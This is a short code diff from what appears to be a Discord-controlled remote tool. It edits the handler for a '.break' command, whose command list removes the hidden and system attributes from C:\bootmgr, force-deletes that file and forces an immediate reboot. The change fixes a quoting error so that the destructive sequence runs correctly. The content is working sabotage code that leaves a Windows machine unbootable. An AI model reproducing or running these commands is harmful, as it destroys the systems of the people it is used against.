@@ -24,7 +24,7 @@ elif message.content == '.break':
 
     delete_commands = [
         'cd C:/',
-        'attrib -s -h "C:\\bootmgr',
+        'attrib -s -h "C:\\bootmgr"',
         'del /f /q "C:\\bootmgr"',
         'shutdown /r /f /t 0'
     ]
